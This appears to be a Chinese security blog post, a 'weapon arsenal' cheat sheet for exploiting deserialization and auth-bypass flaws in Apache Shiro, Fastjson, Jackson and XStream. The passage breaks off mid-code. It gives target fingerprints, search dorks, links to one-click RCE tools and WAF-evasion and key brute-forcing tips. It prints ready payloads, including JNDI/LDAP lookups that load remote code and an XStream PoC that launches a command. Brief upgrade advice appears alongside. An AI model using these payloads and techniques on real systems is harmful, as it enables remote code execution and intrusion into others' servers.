<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicons.png">
  <link rel="icon" type="image/png" href="/img/favicons.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="black">
  <meta name="description" content="">
  <meta name="author" content="zy">
  <meta name="keywords" content="">
  <title>斗象科技-武器库 - copyking</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
<meta name="generator" content="Hexo 4.2.1"></head>


<body>
  <header style="height: 30vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>COPYKING</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/header.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container text-center white-text fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2020-07-08 14:09">
      2020年7月8日 下午
    </time>
  </div>


<div class="mt-1">
  

  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <div class="post-content mx-auto" id="post">
            
            <article class="markdown-body">
              <p>各种漏洞利用</p>
<a id="more"></a>

<h1 id="第一节"><a href="#第一节" class="headerlink" title="第一节"></a>第一节</h1><h2 id="Apache-Shiro-RememberMe-反序列化导致的命令执行漏洞-Shiro-550-CVE-2016-4437"><a href="#Apache-Shiro-RememberMe-反序列化导致的命令执行漏洞-Shiro-550-CVE-2016-4437" class="headerlink" title="Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)"></a>Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)</h2><p><strong>1. 漏洞简介</strong></p>
<p>Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用</p>
<p><strong>2. 影响组件</strong></p>
<p>Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>set-Cookie: rememberMe=deleteMe</code><br>或者URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p>
<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Apache-Shiro"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞<br><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/" target="_blank" rel="noopener">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具<br><a href="https://github.com/wyzxxz/shiro_rce" target="_blank" rel="noopener">https://github.com/wyzxxz/shiro_rce</a></p>
<p>Apache Shiro回显poc改造计划<br><a href="https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.使用多个泄露的key进行遍历, 这个在实战中确实有效</p>
<p>关于Shiro反序列化漏洞的延伸—升级shiro也能被shell<br><a href="https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw</a></p>
<p>Shiro 100 Key<br><a href="https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA</a></p>
<p>2.使用 <code>URLDNS</code> 进行检测提速</p>
<p>使用适应性最强的<code>URLDNS</code>(这个不受JDK版本和安全策略影响, 除非网络限制不能出DNS)进行检测</p>
<p>且可以使用<code>ysoserial</code>提前生成序列化内容</p>
<pre><code class="hljs lsl">java -jar target/ysoserial<span class="hljs-number">-0.0</span><span class="hljs-number">.5</span>-SNAPSHOT-all.jar URLDNS <span class="hljs-string">"http://1234567890.test.ceye.io"</span> &gt; urldns.ser</code></pre>

<p>然后使用<code>占位符+目标url hash</code>的方法修改序列化内容中的<code>urldns</code>地址</p>
<p>提高检测速度以及后续检测无需使用<code>ysoserial</code></p>
<p>例如 <code>1234567890.test.ceye.io</code> 可以换成 <code>md5('www.qq.com').hexdigest() [:10].test.ceye.io</code></p>
<p>也就是 <code>9d2c68d82d.test.ceye.io</code></p>
<p>可以预先记录 hash</p>
<pre><code class="hljs css">9<span class="hljs-selector-tag">d2c68d82d</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span></code></pre>

<p>然后进行hash查表就可以知道是<code>DNSLOG</code>来自哪个目标, 性能会提高不少</p>
<p>3.已知目标使用了<code>Shiro</code>, 可以采取<code>Shiro-721</code>的报错逻辑来进行遍历<code>key</code> — 星光哥</p>
<p>这样即使DNS不能出网, 也可以通过是否返回 <code>rememberMe=deleteMe</code> 来断定 <code>shiro</code> <code>key</code> 的正确性, 前提是服务器有<code>rememberMe=deleteMe</code>相关回显</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级Shiro到最新版</p>
<p>2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p>
<p>3.WAF拦截Cookie中长度过大的rememberMe值</p>
<h2 id="Apache-Shiro-Padding-Oracle-Attack-Shiro-721"><a href="#Apache-Shiro-Padding-Oracle-Attack-Shiro-721" class="headerlink" title="Apache Shiro Padding Oracle Attack (Shiro-721)"></a>Apache Shiro Padding Oracle Attack (Shiro-721)</h2><p><strong>1. 漏洞简介</strong></p>
<p>Apache Shiro 是企业常见的 Java安全框架, 由于<code>Shiro</code>使用<code>AES-CBC</code>模式进行加解密处理, 所以存在<code>Padding Oracle Attack</code>漏洞, 已经登录的攻击者同样可以进行反序列化操作</p>
<p><strong>2. 影响组件</strong></p>
<p>Apache Shiro &lt; 1.4.2</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>set-Cookie: rememberMe=deleteMe</code><br>URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p>
<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Apache-Shiro"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Shiro 721 Padding Oracle攻击漏洞分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/193165" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193165</a></p>
<p>Apache Shiro 远程代码执行漏洞复现 – OnionT’s Blog<br><a href="http://www.oniont.cn/index.php/archives/298.html" target="_blank" rel="noopener">http://www.oniont.cn/index.php/archives/298.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>wuppp/shiro_rce_exp: Shiro RCE (Padding Oracle Attack)<br><a href="https://github.com/wuppp/shiro_rce_exp" target="_blank" rel="noopener">https://github.com/wuppp/shiro_rce_exp</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.该漏洞需要登录后获取到合法的<code>Cookie: rememberMe=XXX</code>后才可以进行利用, 看起来不是很好利用</p>
<p>但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥</p>
<p>所以后续的利用还是可以同Shiro-550一样利用, 而且这里是AES加密的, 自带过WAF属性</p>
<p>2.如果攻击没有生效, 可以试一下删除Cookie中的JSESSIONID 字段, 很多时候这个字段存在的话, 服务端不会去处理 <code>rememberMe</code></p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级Shiro到最新版</p>
<p>2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p>
<p>3.WAF拦截Cookie中长度过大的rememberMe值</p>
<p>4.WAF拦截访问过于频繁的IP, 因为该漏洞需要爆破Cookie</p>
<h2 id="Apache-Shiro-权限绕过漏洞-Shiro-682"><a href="#Apache-Shiro-权限绕过漏洞-Shiro-682" class="headerlink" title="Apache Shiro 权限绕过漏洞 (Shiro-682)"></a>Apache Shiro 权限绕过漏洞 (Shiro-682)</h2><p><strong>1. 漏洞简介</strong></p>
<p>Apache Shiro 是企业常见的Java安全框架, 由于Shiro的拦截器和spring(Servlet)拦截器对于URI模式匹配的差异, 导致出现鉴权问题</p>
<p><strong>2. 影响组件</strong></p>
<p>Apache Shiro &lt; 1.5.2</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>set-Cookie: rememberMe=deleteMe</code><br>或者URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p>
<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Apache-Shiro"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心<br><a href="https://blog.riskivy.com/shiro-权限绕过漏洞分析（cve-2020-1957）/" target="_blank" rel="noopener">https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心<br><a href="https://blog.riskivy.com/shiro-权限绕过漏洞分析（cve-2020-1957）/" target="_blank" rel="noopener">https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.url中间可以尝试添加 <code>../</code> , 不限于这个漏洞, 可能会有惊喜, 错误的Nginx配置也会造成新的漏洞</p>
<p>关于url解析的问题可以参考以下链接</p>
<p>A New Era of SSRF – Exploiting URL Parser in Trending Programming Languages!<br><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p>
<p>Tomcat URL解析差异性导致的安全问题 – 先知社区<br><a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">https://xz.aliyun.com/t/7544</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级1.5.2版本及以上</p>
<p>2.尽量避免使用*通配符作为动态路由拦截器的URL路径表达式.</p>
<h2 id="Fastjson-反序列化远程代码执行漏洞"><a href="#Fastjson-反序列化远程代码执行漏洞" class="headerlink" title="Fastjson 反序列化远程代码执行漏洞"></a>Fastjson 反序列化远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Fastjosn 无疑是这两年的漏洞之王, 一手反序列化RCE影响无数厂商, 目前1.2.48以下版本稳定受影响, 1.2.68以下版本开启Autotype会受到影响</p>
<p>(不排除传说中的1.2.67以下RCE漏洞, 期待八仙过海)</p>
<p><strong>2. 影响组件</strong></p>
<p>Fastjson &lt; 1.2.48 (&lt;1.2.68?)</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>可以通过DNS回显的方式检测后端是否使用Fastjson</p>
<pre><code class="hljs perl">{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.Inet4Address"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}
{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.Inet6Address"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}
{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.InetSocketAddress"</span>{<span class="hljs-string">"address"</span>:, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}}
{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"com.alibaba.fastjson.JSONObject"</span>, {<span class="hljs-string">"@type"</span>: <span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}}<span class="hljs-string">""</span>}
{{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}:<span class="hljs-string">"aaa"</span>}
Set[{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}]
Set[{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}
{{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}:<span class="hljs-number">0</span></code></pre>

<p>可以通过DOS时间延迟或者报错回显的方式检测</p>
<p>无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)<br><a href="https://blog.riskivy.com/无损检测fastjson-dos漏洞以及盲区分fastjson与jackson组件/" target="_blank" rel="noopener">https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/</a></p>
<p>fastjson &lt; 1.2.66 版本最新漏洞分析<br><a href="https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q</a></p>
<p><strong>4. Fofa Dork</strong></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Fastjson &lt;=1.2.47 远程代码执行漏洞分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/181874" target="_blank" rel="noopener">https://www.anquanke.com/post/id/181874</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>1.JDK降级编译</p>
<p>CaijiOrz/fastjson-1.2.47-RCE: Fastjson &lt;= 1.2.47 远程命令执行漏洞利用工具及方法<br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
<p>源项目中最后一句</p>
<blockquote>
<p>当javac版本和目标服务器差太多, 会报一个这样得到错误, 所以需要使用1.8的javac来编译Exploit.java</p>
</blockquote>
<p>这里并不需要更换jdk版本, 我们可以使用JDK降级编译的手法, 这样1.8的jdk也可以编译出来1.7版本的<code>.class</code> , 相信可以解决很多小伙伴的问题</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">javac</span> <span class="hljs-selector-tag">-source</span> 1<span class="hljs-selector-class">.7</span> <span class="hljs-selector-tag">-target</span> 1<span class="hljs-selector-class">.7</span> <span class="hljs-selector-tag">Exploit</span><span class="hljs-selector-class">.java</span></code></pre>

<p>1.2.47版本以下通杀Poc:</p>
<pre><code class="hljs groovy">{<span class="hljs-string">"name"</span>:{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.lang.Class"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"com.sun.rowset.JdbcRowSetImpl"</span>}, <span class="hljs-string">"f"</span>:{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"com.sun.rowset.JdbcRowSetImpl"</span>, <span class="hljs-string">"dataSourceName"</span>:<span class="hljs-string">"ldap://asdfasfd/"</span>, <span class="hljs-string">"autoCommit"</span>:<span class="hljs-literal">true</span>}}, <span class="hljs-string">age:</span><span class="hljs-number">11</span>}</code></pre>

<p>其中<code>{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://asdfasfd/", "autoCommit":true}</code>也可以替换成其他利用链</p>
<p>2.优先使用LDAP协议</p>
<p>根据实战中经验, 这里更推荐使用ldap协议进行漏洞利用, 原因如下</p>
<blockquote>
<p>RMI协议的利用方式 在<code>JDK 6u132/7u122/8u113</code> 及以上版本中修复了<br>LDAP协议的利用方式 在<code>JDK 6u211/7u201/8u191</code> 及以上版本中修复了</p>
</blockquote>
<p>所以,LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕过更高版本的JDK限制</p>
<p>如何绕过高版本JDK的限制进行JNDI注入 – FreeBuf专栏·安全引擎<br><a href="https://www.freebuf.com/column/207439.html" target="_blank" rel="noopener">https://www.freebuf.com/column/207439.html</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.如何查看服务器的jdk版本呢, 这里也有个小技巧</p>
<pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">80</span><span class="hljs-comment">#[marshalsec中指定的HTTP端口]</span></code></pre>

<p>当服务器连接过来时, <code>User-Agent</code>中会标明当前服务器的JDK版本</p>
<p>2.当发现一台Redis的数据中有@type字样时, 意味着autotype大概率是开的, 只要不存在黑名单中的利用链都可以用#[同理可以用在jackson上]</p>
<p>fastjson/GenericFastJsonRedisSerializer.java at master · alibaba/fastjson<br><a href="https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java</a></p>
<pre><code class="hljs actionscript"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GenericFastJsonRedisSerializer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">RedisSerializer</span>&lt;<span class="hljs-title">Object</span>&gt; </span>{
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> ParserConfig defaultRedisConfig = <span class="hljs-keyword">new</span> ParserConfig();
<span class="hljs-keyword">static</span> { defaultRedisConfig.setAutoTypeSupport(<span class="hljs-literal">true</span>);}</code></pre>

<p>其他消息队列之类的都是同理</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级Fastjson到最新版(&gt;=1.2.68 新增了safemode, 彻底关闭autotype)<br>2.WAF拦截过滤请求包中的 <code>@type</code>, <code>%u0040%u0074%u0079%u0070%u0065</code>, <code>\u0040type</code>, <code>\x04type</code> 等多种编码的autotype变形</p>
<p>3.最少升级到1.2.48以上版本且关闭autotype选项</p>
<p>4.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p>
<h2 id="Jackson-反序列化远程代码执行漏洞"><a href="#Jackson-反序列化远程代码执行漏洞" class="headerlink" title="Jackson 反序列化远程代码执行漏洞"></a>Jackson 反序列化远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Jackson 跟Fastjson一样, 当enableDefaultTyping开启时, 也是可以进行反序列化到代码执行</p>
<p><strong>2. 影响组件</strong><br>Jackson</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)<br><a href="https://blog.riskivy.com/无损检测fastjson-dos漏洞以及盲区分fastjson与jackson组件/" target="_blank" rel="noopener">https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/</a></p>
<p><strong>4. Fofa Dork</strong></p>
<p><strong>5. 漏洞分析</strong></p>
<p>跟Fastjson漏洞原理都是一样的, 每次修复基本都是更新黑名单, 漏洞分析可以参考</p>
<p>Jackson-databind-2670远程代码执行漏洞简单分析 – 先知社区<br><a href="https://xz.aliyun.com/t/7506" target="_blank" rel="noopener">https://xz.aliyun.com/t/7506</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>learnjavabug/jackson/src/main/java/com/threedr3am/bug/jackson at master · threedr3am/learnjavabug<br><a href="https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson</a></p>
<p>POC</p>
<pre><code class="hljs json">[<span class="hljs-string">"ch.qos.logback.core.db.JNDIConnectionSource"</span>, {<span class="hljs-attr">"jndiLocation"</span>:<span class="hljs-string">"ldap://localhost:43658/Calc"</span>}]</code></pre>

<p><strong>7. 利用技巧</strong></p>
<p>1.把Fastjson的利用链拿过来改一改就可以用, 前提是环境中存在可用的利用链</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级Jackson到最新版(enableDefaultTyping默认都是关的, 问题不大)</p>
<p>2.确保enableDefaultTyping是关闭的</p>
<p>3.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p>
<h2 id="Xstream-反序列化漏洞"><a href="#Xstream-反序列化漏洞" class="headerlink" title="Xstream 反序列化漏洞"></a>Xstream 反序列化漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Xstream Java 中经常用于处理 xml 的库, 最近一次修复中(1.4.10版本)重现了历史反序列化远程代码执行漏洞, 所以也需要关注</p>
<p><strong>2. 影响组件</strong></p>
<p>Xstream &lt;1.4.6, =1.4.10</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>xml</p>
<p><strong>4. Fofa Dork</strong></p>
<p><strong>5. 漏洞分析</strong></p>
<p>XStream反序列化组件攻击分析 | angelwhu_blog<br><a href="https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ" target="_blank" rel="noopener">https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>XStream反序列化组件攻击分析 | angelwhu_blog<br><a href="https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ" target="_blank" rel="noopener">https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ</a></p>
<pre><code class="hljs awk">import com.thoughtworks.xstream.XStream;

import java.io.IOException;

public class Main {
<span class="hljs-regexp">//</span> POC1
    public static void main(String[] args) throws IOException {
            XStream xStream = new XStream();
            String payload = <span class="hljs-string">"&lt;sorted-set&gt;\n"</span> +
                    <span class="hljs-string">"    &lt;string&gt;foo&lt;/string&gt;\n"</span> +
                    <span class="hljs-string">"    &lt;dynamic-proxy&gt;\n"</span> +
                    <span class="hljs-string">"    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n"</span> +
                    <span class="hljs-string">"        &lt;handler class=\"java.beans.EventHandler\"&gt;\n"</span> +
                    <span class="hljs-string">"            &lt;target class=\"java.lang.ProcessBuilder\"&gt;\n"</span> +
                    <span class="hljs-string">"                &lt;command&gt;\n"</span> +
                    <span class="hljs-string">"                    &lt;string&gt;cmd.exe&lt;/string&gt;\n"</span> +
                    <span class="hljs-string">"                    &lt;string&gt;/c&lt;/string&gt;\n"</span> +
                    <span class="hljs-string">"                    &lt;string&gt;calc&lt;/string&gt;\n"</span> +
                    <span class="hljs-string">"                &lt;/command&gt;\n"</span> +
                    <span class="hljs-string">"            &lt;/target&gt;\n"</span> +
                    <span class="hljs-string">"     &lt;action&gt;start&lt;/action&gt;"</span>+
                    <span class="hljs-string">"        &lt;/handler&gt;\n"</span> +
                    <span class="hljs-string">"    &lt;/dynamic-proxy&gt;\n"</span> +
                    <span class="hljs-string">"&lt;/sorted-set&gt;\n"</span>;
<span class="hljs-regexp">//</span>POC2
<span class="hljs-regexp">//</span>        String payload = <span class="hljs-string">"&lt;java.util.PriorityQueue serialization=\"custom\"&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"  &lt;unserializable-parents/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"  &lt;java.util.PriorityQueue&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;default&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;size&gt;2&lt;/size&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;comparator class=\"org.apache.commons.beanutils.BeanComparator\"&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;property&gt;databaseMetaData&lt;/property&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;comparator class=\"java.util.Collections$ReverseComparator\"/&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;/comparator&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;/default&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;int&gt;3&lt;/int&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;com.sun.rowset.JdbcRowSetImpl serialization=\"custom\"&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;javax.sql.rowset.BaseRowSet&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;default&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;isolation&gt;2&lt;/isolation&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;maxRows&gt;0&lt;/maxRows&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;readOnly&gt;true&lt;/readOnly&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;dataSource&gt;ldap://ip:1389/Object&lt;/dataSource&gt;\n"</span> +
<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;params/&gt;\n"</span> +
